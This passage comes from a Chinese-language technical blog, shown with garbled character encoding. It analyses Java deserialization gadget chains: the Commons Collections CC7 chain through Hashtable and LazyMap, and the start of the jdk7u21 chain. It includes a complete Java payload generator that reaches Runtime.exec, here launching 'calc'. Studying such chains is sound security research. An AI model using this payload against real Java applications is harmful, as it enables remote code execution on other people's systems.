<p>è€Œè¿™äº›å†…å®¹æ˜¯æ¥è‡ª <code>Hashtable</code> ç±»çš„ <code>table</code> å±æ€§ï¼Œæ˜¯å¯æ§çš„ï¼Œä¸”ç”±äºä¼šåœ¨ <code>readObject</code> æ–¹æ³•ä¸­è¯»å–è¿™äº›å†…å®¹ï¼Œé‚£ä¹ˆ <code>table</code> å±æ€§ä¹Ÿæ˜¯å¯ä»¥çœ‹ä½œå¯åºåˆ—åŒ–çš„ï¼Œè¿›è€Œä¼ å…¥ <code>reconstitutionPut</code> æ–¹æ³•çš„ <code>key</code> å’Œ <code>value</code> å‚æ•°æ˜¯å¯æ§å¯åºåˆ—åŒ–çš„ã€‚</p>
<p>ç»§ç»­è·Ÿè¿› <code>reconstitutionPut</code> æ–¹æ³•ğŸ‘‡</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202151412510.png" alt="image-20220215141240414"></p>
<p>å¯è§å¦‚æœæ„é€ åˆé€‚çš„å€¼ï¼Œè®© <code>e.hash == hash</code> æˆç«‹æ—¶ä¼šæ‰§è¡Œåˆ° <code>e.key.equals(key)</code> è¿™æ¡è¯­å¥ï¼Œè€Œå˜é‡ <code>e</code> æ¥è‡ª <code>tab</code> å˜é‡ï¼Œä¹Ÿå°±æ˜¯ <code>Hashtable</code> ç±»çš„ <code>table</code> å±æ€§ï¼›åŒæ—¶åœ¨è¿™ä¸ª <code>reconstitutionPut</code> æ–¹æ³•åé¢ä¼šæœ‰ä¸€ä¸ªå°†ä¼ å…¥çš„ <code>key</code> å’Œ <code>value</code> å‚æ•°å­˜å‚¨è‡³ <code>table</code> å±æ€§çš„æ“ä½œï¼Œè¿™å°±æ„å‘³ç€å˜é‡ <code>e</code> çš„å€¼æ˜¯å¯ä»¥é€šè¿‡åºåˆ—åŒ–æ•°æ®æ§åˆ¶çš„ï¼Œä¹Ÿå¯ä»¥è¯´æ˜¯å¯æ§çš„ã€‚</p>
<p>æ­¤æ—¶ä¹Ÿå°±å¯ä»¥å¾—åˆ°å½¢å¦‚ <code>[å¯æ§].equals()</code> çš„ç»“æ„ï¼Œæ¥ç€æ¥çœ‹ <code>LazyMap</code> ç±»ğŸ‘‡</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202151419224.png" alt="image-20220215141947170"></p>
<p>å®ƒæ˜¯å±äº <code>AbstractMapDecorator</code> çš„å­ç±»ï¼Œå†è·Ÿè¿› <code>AbstractMapDecorator</code> ç±»ï¼Œå¯ä»¥å‘ç°å…¶æ‹¥æœ‰ <code>equals</code> æ–¹æ³•ğŸ‘‡</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202151421264.png" alt="image-20220215142133217"></p>
<p>å¦‚æœä¼ å…¥ <code>equals</code> çš„å‚æ•°å†…å®¹ä¸ä¸ºè‡ªèº«æ—¶ï¼Œä¼šæ¥ç€è°ƒç”¨ <code>equals</code> æ–¹æ³•ï¼Œç”±äº <code>this.map</code> å±æ€§ä¸º <code>Map</code> æ¥å£ï¼Œä¸”è¿™ä¸ªå±æ€§çš„å€¼å¯ä»¥ç”± <code>AbstractMapDecorator</code> ç±»çš„æ„é€ æ–¹æ³•èµ‹å€¼ğŸ‘‡</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202151425642.png" alt="image-20220215142534574"></p>
<p>æ˜¾ç„¶ <code>LazyMap</code> ç±»çš„æ„é€ æ–¹æ³•å­˜åœ¨ <code>super()</code> çš„è°ƒç”¨ğŸ‘‡</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202151427797.png" alt="image-20220215142700703"></p>
<p>å› æ­¤ <code>this.map</code> å±æ€§ä¹Ÿå°±æ˜¯å¯æ§çš„äº†ï¼Œå†æ¥çœ‹ <code>AbstractMap</code> ç±»çš„ <code>equals</code> æ–¹æ³•ğŸ‘‡</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202151429663.png" alt="image-20220215142942549"></p>
<p>å¯ä»¥çœ‹åˆ°å­˜åœ¨å½¢å¦‚ <code>[(Map)å¯æ§].get()</code> çš„ç»“æ„ï¼Œé‚£ä¹ˆå‡å¦‚å°†ä¸Šé¢çš„ <code>this.map</code> å±æ€§æ„é€ æˆ <code>AbstractMap</code> çš„å­ç±»ï¼Œå¦‚ç©ºçš„ <code>HashMap</code> ç±»ï¼Œç„¶åæ„é€ å¥½ä¼ å…¥çš„å‚æ•° <code>o</code> ä¸º <code>LazyMap</code> å°±å¯ä»¥åˆ°è¾¾ <code>LazyMap.get</code> çš„å½¢å¼äº†ï¼Œåé¢å°±æ˜¯æœ‰å…³ <code>Transformer</code> è°ƒç”¨çš„ <code>payload</code> æ‹¼æ¥äº†ã€‚</p>
<p>é‡æ–°æ¥çœ‹ <code>Hashtable</code> ç±»çš„ <code>reconstitutionPut</code> æ–¹æ³•ğŸ‘‡</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202151449087.png" alt="image-20220215144953002"></p>
<p>ç”±äºè¿™é‡Œçš„ <code>(e.hash == hash) &amp;&amp; e.key.equals(key)</code> éœ€è¦å‰ä¸€æ®µï¼Œä¹Ÿå°±æ˜¯ <code>e.hash</code> å¿…é¡»æˆç«‹ï¼Œè€Œå˜é‡ <code>e</code> æ¥è‡ª <code>table</code> å±æ€§ï¼Œå˜é‡ <code>hash</code> åˆ™æ¥è‡ªè¯»å–çš„å†…å®¹ï¼Œå°±éœ€è¦æ„é€ ä¸€ä¸ªå®¹é‡è‡³å°‘ä¸º <code>2</code> çš„ <code>Hashtable</code> ï¼Œä»¥ä¾¿ç¬¬ä¸€ä¸ªå†…å®¹ä» <code>reconstitutionPut</code> æ–¹æ³•æ³¨å†Œè¿› <code>table</code> å±æ€§åï¼Œç¬¬äºŒä¸ªå†…å®¹èƒ½å’Œç¬¬ä¸€ä¸ªå†…å®¹(åœ¨ <code>table</code> å±æ€§é‡Œçš„)ä½œæ¯”è¾ƒã€‚</p>
<p>åŒæ—¶è¦æ»¡è¶³ç¬¬äºŒä¸ªå†…å®¹èƒ½å’Œç¬¬ä¸€ä¸ªå†…å®¹ä½œæ¯”è¾ƒï¼Œå°±å¿…é¡»è®©å˜é‡ <code>index</code> å€¼ç›¸ç­‰ï¼Œè€Œå˜é‡ <code>index</code> çš„å€¼ç”± <code>hash</code> å˜é‡è®¡ç®—å¾—åˆ°ï¼Œå˜é‡ <code>hash</code> çš„å€¼åˆç”±ä¼ å…¥çš„ <code>key</code> å‚æ•°çš„ <code>hashCode</code> æ–¹æ³•å¾—åˆ°ï¼Œè¿™å°±éœ€è¦æ„é€ çš„å®¹é‡ä¸º <code>2</code> çš„ <code>Hashtable</code> é”®åå€¼çš„ <code>hashCode</code> æ–¹æ³•å¾—åˆ°çš„å€¼å¿…é¡»æ˜¯ä¸€æ ·çš„ã€‚</p>
<p>å¦å¤–ç”±ä¸Šé¢çš„åˆ†æå¯çŸ¥ï¼Œè¿™ä¸ªéœ€è¦æ„é€ çš„å®¹é‡ä¸º <code>2</code> çš„ <code>Hashtable</code> çš„é”®åå€¼å¿…é¡»ä¸º <code>LazyMap</code> ç±»ï¼Œè¿™æ ·æ‰èƒ½åœ¨æœ€å <code>AbstractMap</code> ç±»ä¸­ <code>equals</code> æ–¹æ³•ä¸­ç”± <code>e.key.equals(key)</code> -&gt; <code>m = Key</code> -&gt; <code>m.get()</code> ã€‚</p>
<p>æ­¤æ—¶è¿™ä¸ªéœ€è¦æ„é€ çš„ <code>Hashtable</code> å†…å®¹å¤§è‡´å¦‚ä¸‹ğŸ‘‡</p>
<ul>
<li><code>Hashtable.put([LazyMapç±»(new HashMap(),Transformerçš„payload)],[ä»»æ„å€¼])</code></li>
<li><code>Hashtable.put([LazyMapç±»(new HashMap(),Transformerçš„payload)],[ä»»æ„å€¼])</code></li>
</ul>
<p>å†æ¥çœ‹å¦‚ä½•è®© <code>e.hash == hash</code> ï¼Œæ˜¾ç„¶ç”±äºä¼ å…¥çš„ <code>key</code> å‚æ•°å·²ç»è¢«è§„å®šä¸º <code>LazyMap</code> ï¼Œè·Ÿè¿› <code>LazyMap</code> ç±»çš„ <code>HashCode</code> æ–¹æ³•(åœ¨ <code>AbstractMapDecorator</code> ä¸­)ğŸ‘‡</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202151505522.png" alt="image-20220215150553475"></p>
<p>å¯è§æ˜¯ç”¨äº† <code>this.map</code> å±æ€§çš„ <code>hashCode</code> æ–¹æ³•å¾—åˆ°çš„ç»“æœï¼Œè€Œ <code>this.map</code> åˆ™è¢«è§„å®šä¸ºäº† <code>HashMap</code> ï¼Œæ¥åˆ° <code>AbstractMap</code> ç±»å¯ä»¥å¾—åˆ° <code>HashCode</code> æ–¹æ³•çš„å…·ä½“å®ç°ğŸ‘‡</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202151512126.png" alt="image-20220215151250071"></p>
<p>å¾—åˆ°çš„æ˜¯éå†æ•´ä¸ª <code>HashMap</code> ï¼Œè®¡ç®—å…¶æ¯ä¸ªå…ƒç´ é€šè¿‡ <code>hashCode</code> æ–¹æ³•å¾—åˆ°çš„å€¼ä¹‹å’Œï¼Œè€Œè¿™ä¸ªå…ƒç´ å®é™…ä¸Šæ˜¯ <code>HashMap</code> ç±»ä¸­çš„ <code>Node</code> ç±»ï¼Œä¸‹é¢æ˜¯å…¶ <code>hashCode</code> æ–¹æ³•çš„å®ç°ğŸ‘‡</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202151518629.png" alt="image-20220215151850541"></p>
<p>ç®€å•æ¥è¯´å°±æ˜¯å„è°ƒç”¨é”®åå€¼å’Œå¯¹åº”å€¼çš„ <code>hashCode</code> æ–¹æ³•ï¼Œè®¡ç®—ä¸¤è€…å¼‚æˆ–å¾—åˆ°çš„ç»“æœä½œä¸º <code>hashCode</code> æ–¹æ³•çš„è¿”å›å€¼ã€‚</p>
<p>é‚£ä¹ˆå¦‚ä½•è®©å…¶é€šè¿‡ <code>hashCode</code> æ–¹æ³•å¾—åˆ°çš„å€¼ç›¸ç­‰å‘¢ï¼Œè¿™æ–¹æ³•å¯å°±å¤šäº†ï¼Œåƒä»€ä¹ˆç©å­—ç¬¦æº¢å‡ºçš„ï¼Œå­—ç¬¦0å€¼çš„ï¼Œå­—ç¬¦ç¢°æ’å•¥çš„éƒ½è¡Œã€‚å¦‚æœä»ç®€å•çš„è§’åº¦æ¥è¯´ï¼Œç”±äºåœ¨javaä¸­æ•°å€¼çš„ <code>hashCode</code> æ–¹æ³•å¾—åˆ°çš„å€¼ä¸€èˆ¬æ˜¯å…¶æœ¬èº«çš„æ•´å‹ï¼Œä¼—æ‰€å‘¨çŸ¥ä»»æ„æ•°å¼‚æˆ–æœ¬èº«å¾—æ•°ä¸º0ï¼Œåƒæ˜¯ <code>1</code> å’Œ <code>1</code> å¼‚æˆ–å¾—åˆ°çš„å€¼å°±ä¸º0ï¼Œ<code>2</code> å’Œ <code>2</code> å¼‚æˆ–ä¹Ÿä¸º0ï¼Œä¹Ÿå°±å¯ä»¥è®©å­˜å‚¨åœ¨ <code>LazyMap</code> ä¸­çš„ <code>HashMap</code> å†…å®¹è®¾æˆä¸¤ä¸ªç›¸ç­‰çš„æ•°å€¼ã€‚</p>
<p>ä½†ç”±äº <code>Hashtable</code> ç±»çš„ <code>put</code> æ–¹æ³•ä¸­ä¹Ÿå­˜åœ¨ <code>equals</code> æ–¹æ³•çš„è°ƒç”¨æ“ä½œğŸ‘‡</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202151603792.png" alt="image-20220215160327702"></p>
<p>åœ¨æ„é€  <code>payload</code> æ—¶å¦‚æœè¿›è¡Œ <code>put</code> æ“ä½œï¼Œå°±ä¼šé—´æ¥é€šè¿‡ <code>LazyMap</code> ç±»çš„ <code>get</code> æ–¹æ³•ä¸­çš„ <code>super.map.put(key, value)</code> å°†ç¬¬ä¸€ä¸ª <code>LazyMap</code> çš„ <code>HashMap</code> é”®åä»¥åŠè°ƒç”¨ <code>payload</code> å¾—åˆ°çš„å€¼æ”¾å…¥ç¬¬äºŒä¸ª <code>LazyMap</code> çš„ <code>HashMap</code> ä¸­ğŸ‘‡</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202151614155.png" alt="image-20220215161447059"></p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202151610357.png" alt="image-20220215161044296"></p>
<p>å› æ­¤åœ¨æ„é€  <code>payload</code> æ—¶ä¸ä»…éœ€è¦å…ˆèµ‹å‡å€¼ç„¶åé€šè¿‡åå°„æ”¹å€¼ï¼Œè¿˜å¾— <code>remove</code> æ‰ç¬¬äºŒä¸ª <code>LazyMap</code> ä¸­ <code>HashMap</code> å¤šå‡ºçš„é”®å€¼å¯¹ã€‚</p>
<h4 id="payload-8"><a href="#payload-8" class="headerlink" title="- payload -"></a>- payload -</h4><p>è¿™æ¡é“¾çš„ <code>payload</code> å°±æœ‰äº›å¤æ‚äº†ğŸ‘‡</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test7</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Field f = obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        f.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        f.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Transformer[] getTransformers(String cmd) &#123;</span><br><span class="line">        Transformer[] tfs = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> Class[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> Class[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> Class[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> Class[]&#123;String.class&#125;, <span class="keyword">new</span> String[]&#123;cmd&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> tfs;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ç”Ÿæˆæœ‰å…³å‡çš„æœ‰å…³Transformerçš„payload</span></span><br><span class="line">        Transformer[] fake = <span class="keyword">new</span> Transformer[]&#123;<span class="keyword">new</span> ConstantTransformer(<span class="string">&quot;1&quot;</span>)&#125;;</span><br><span class="line"></span><br><span class="line">        Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(fake);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// æ„é€ ä¸¤ä¸ªLazyMap</span></span><br><span class="line">        Map map1 = LazyMap.decorate(<span class="keyword">new</span> HashMap(), transformerChain);</span><br><span class="line">        Map map2 = LazyMap.decorate(<span class="keyword">new</span> HashMap(), transformerChain);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// å…¶ä¸­ map1.hashCode = map2.hashCode = 0</span></span><br><span class="line">        map1.put(<span class="number">1</span>,<span class="number">1</span>);</span><br><span class="line">        map2.put(<span class="number">2</span>,<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// æ„é€ Hashtable</span></span><br><span class="line">        Hashtable ht = <span class="keyword">new</span> Hashtable();</span><br><span class="line">        ht.put(map1,<span class="string">&quot;123&quot;</span>);</span><br><span class="line">        ht.put(map2,<span class="string">&quot;321&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// åˆ é™¤å¤šä½™é”®å€¼å¯¹</span></span><br><span class="line">        map2.remove(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// åœ¨putå®Œæ¯•åå†é€šè¿‡åå°„èµ‹å€¼ä»¥å…æœ¬åœ°æ‰§è¡Œ</span></span><br><span class="line">        setFieldValue(transformerChain,<span class="string">&quot;iTransformers&quot;</span>,getTransformers(<span class="string">&quot;calc&quot;</span>));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ååºåˆ—åŒ–æµ‹è¯•</span></span><br><span class="line">        ByteArrayOutputStream barr = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(barr);</span><br><span class="line">        oos.writeObject(ht);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> ByteArrayInputStream(barr.toByteArray()));</span><br><span class="line">        ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>æ‰§è¡Œç»“æœğŸ‘‡</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202151620590.png" alt="image-20220215162003391"></p>
<p>æ˜¯æˆåŠŸäº†ã€‚</p>
<h2 id="jdk7u21"><a href="#jdk7u21" class="headerlink" title="- jdk7u21 -"></a>- jdk7u21 -</h2><p>å®éªŒç¯å¢ƒï¼š</p>
<ul>
<li><code>jdk1.6.0_45</code></li>
</ul>
<h3 id="è°ƒç”¨ç»“æ„-7"><a href="#è°ƒç”¨ç»“æ„-7" class="headerlink" title="- è°ƒç”¨ç»“æ„ -"></a>- è°ƒç”¨ç»“æ„ -</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">HashSet.readObject()</span><br><span class="line">	ğŸ‘‡</span><br><span class="line">	HashMap.put()</span><br><span class="line">	ğŸ‘‡</span><br><span class="line">	(Map)Proxy.equals()</span><br><span class="line">	ğŸ‘‡</span><br><span class="line">	(Map)Proxy.invoke() &lt;=&gt; AnnotationInvocationHandler.invoke()</span><br><span class="line">    ğŸ‘‡</span><br><span class="line">    AnnotationInvocationHandler.equalsImpl()</span><br><span class="line">    	ğŸ‘‡</span><br><span class="line">		TemplatesImpl.newTransformer()</span><br><span class="line">        ğŸ‘‡</span><br><span class="line">        TemplatesImpl.getTransletInstance()</span><br><span class="line">        ğŸ‘‡</span><br><span class="line">        TemplatesImpl.defineTransletClasses()</span><br><span class="line">        ğŸ‘‡</span><br><span class="line">        newInstance()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="åˆ†æ-9"><a href="#åˆ†æ-9" class="headerlink" title="- åˆ†æ -"></a>- åˆ†æ -</h3><p>è¿™ä¸ªé“¾çš„å’Œ <code>CC7</code> é“¾å·®ä¸å¤šï¼Œéƒ½éœ€è¦å¾€é‡Œé¢å¡ä¸¤ä¸ªå†…å®¹ï¼Œç„¶åé€šè¿‡ <code>ååºåˆ—åŒ–</code> æ³¨å†Œè¿› <code>table</code> å±æ€§åè¿›è¡Œæœ‰å…³ <code>equals</code> æ–¹æ³•è°ƒç”¨ï¼Œä¸è¿‡ç”¨çš„æ˜¯ <code>HashMap</code> çš„ <code>put</code> æ–¹æ³•ï¼Œåœ¨ç»“æ„ä¸Šä¼šæœ‰äº›ä¸åŒã€‚ </p>
<p>å…ˆæ¥çœ‹ <code>AnnotationInvocationHandler</code> çš„ <code>equalsImpl</code> æ–¹æ³•ğŸ‘‡</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202171115155.png" alt="image-20220217111454977"></p>
<p>è¿™é‡Œä¼šè°ƒç”¨è‡ªèº«çš„ <code>getMemberMethods</code> æ–¹æ³•è·å– <code>æŸä¸ªç±»</code> çš„æ‰€æœ‰æ–¹æ³•ï¼Œç„¶åéå†è¿™äº›æ–¹æ³•ä¾æ¬¡è¿›è¡Œè°ƒç”¨ï¼Œè·Ÿè¿› <code>getMemberMethods</code> æ–¹æ³•ğŸ‘‡</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202171117282.png" alt="image-20220217111707216"></p>
<p>å¯è§æ˜¯è·å–äº† <code>this.type</code> å±æ€§çš„æ‰€æœ‰æ–¹æ³•ï¼Œæ˜¾ç„¶ <code>this.type</code> å±æ€§æ˜¯å¯æ§ä¸”å¯åºåˆ—åŒ–çš„ğŸ‘‡</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202171120804.png" alt="image-20220217112034758"></p>
<p>é‚£ä¹ˆå‡è®¾å°† <code>this.type</code> çš„å€¼æ§åˆ¶æˆ <code>TemplatesImpl</code> ç±»ï¼Œä¹Ÿå°±å¯ä»¥éå†è°ƒç”¨ <code>TemplatesImpl</code> çš„æ‰€æœ‰æ–¹æ³•ï¼Œè€Œåœ¨è¿™äº›æ–¹æ³•ä¸­å°±å­˜åœ¨ç€ <code>newTransformer</code> æ–¹æ³•ï¼Œè¿›è€Œè¾¾æˆ <code>TemplatesImpl</code> çš„ <code>payload</code> ã€‚</p>
<p>å› æ­¤ç°åœ¨çš„å…³æ³¨ç‚¹æ¥åˆ°äº† <code>AnnotationInvocationHandler</code> ä»£ç†è°ƒç”¨çš„å…·ä½“å®ç°ï¼Œå…ˆæ¥çœ‹ <code>HashSet</code> çš„ <code>readObject</code> æ–¹æ³•ğŸ‘‡</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202171125256.png" alt="image-20220217112545163"></p>
<p>ä¼šå…ˆéå†å°†å†™å…¥è¯»å–åºåˆ—åŒ–çš„å†…å®¹è¿›è¡Œ <code>ååºåˆ—åŒ–</code> å¹¶å°†ç»“æœä½œä¸ºå‚æ•°è°ƒç”¨ <code>map</code> å±æ€§çš„ <code>put</code> æ–¹æ³•ï¼Œè¿™äº›å†™å…¥çš„å†…å®¹æ¥è‡ªå…¶ <code>writeObject</code> æ–¹æ³•ğŸ‘‡</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202171127908.png" alt="image-20220217112731818"></p>
<p>ä¹Ÿå°±æ˜¯å¯ä»¥å°†è¿™äº›åœ¨ <code>readObject</code> æ–¹æ³•ä¸­è¯»å–çš„åºåˆ—åŒ–å†…å®¹å½“ä½œæ˜¯æ§ä¸”å¯åºåˆ—åŒ–çš„ï¼Œç»§ç»­è·Ÿè¿› <code>map</code> å±æ€§çš„ <code>put</code> æ–¹æ³•ï¼Œç”±äº <code>map</code> å±æ€§ç±»å‹ä¸º <code>HashMap</code> ğŸ‘‡</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202171130811.png" alt="image-20220217113008760"></p>
<p>é‚£ä¹ˆç›´æ¥æ¥çœ‹ <code>HashMap</code> ç±»çš„ <code>put</code> æ–¹æ³•ğŸ‘‡</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202171131754.png" alt="image-20220217113157674"></p>
<p>è¿™å’Œ <code>CC7</code> é“¾ä¸­çš„ <code>put</code> æ–¹æ³•éƒ¨åˆ†çš„æ“ä½œå®é™…ä¸Šæ˜¯å·®ä¸å¤šçš„ï¼Œå”¯ä¸€çš„åŒºåˆ«æ˜¯è¿™é‡Œæ˜¯ä»¥ç¬¬ä¸€ä¸ªå†…å®¹çš„é”®åçš„å€¼ä½œä¸ºå‚æ•°å»è°ƒç”¨ç¬¬äºŒä¸ªå†…å®¹çš„ <code>equals</code> æ–¹æ³•ã€‚</p>
<p>å› æ­¤å¿…é¡»ä¿è¯ <code>HashMap</code> ä¸­ä¸¤ä¸ªå†…å®¹çš„ <code>hashCode</code> æ˜¯ä¸€è‡´çš„ï¼Œè‡³äºè¿™ä¸¤ä¸ªå†…å®¹çš„æ„æˆç»“æ„ä¸ºå¦‚ä¸‹ğŸ‘‡</p>
<ul>
<li><code>HashSet.put([TemplatesImplç±»()])</code></li>
<li><code>HashSet.put([AnnotationInvocationHandç±»()])</code></li>
</ul>
<p>å…¶ä¸­ç¬¬ä¸€ä¸ªå†…å®¹çš„ <code>TemplatesImpl</code> ç±»å³æ˜¯ <code>TemplatesImpl</code> çš„ <code>payload</code> å†…å®¹ï¼Œç¬¬äºŒä¸ªå†…å®¹çš„ <code>AnnotationInvocationHand</code> ç±»ä½œä¸ºä»£ç†ä½¿ç”¨ã€‚è‡³äºç¬¬ä¸€ä¸ªå†…å®¹å¿…é¡»å…ˆä¸º <code>TemplatesImpl</code> ç±»çš„åŸå› æ˜¯åœ¨æœ€å <code>AnnotationInvocationHand</code> ç±»çš„  <code>equalsImpl</code> æ–¹æ³•ä¸­ğŸ‘‡</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202171140820.png" alt="image-20220217114011691"></p>
<p>è¿™ä¸ª <code>invoke</code> æ–¹æ³•æ‰€ä½¿ç”¨çš„ç±»æ¥è‡ª <code>equals</code> æ–¹æ³•ä¼ å…¥çš„å‚æ•°ï¼Œæ˜¾ç„¶æ˜¯å¿…é¡»ä¸º <code>TemplatesImpl</code> ç±»çš„ã€‚</p>
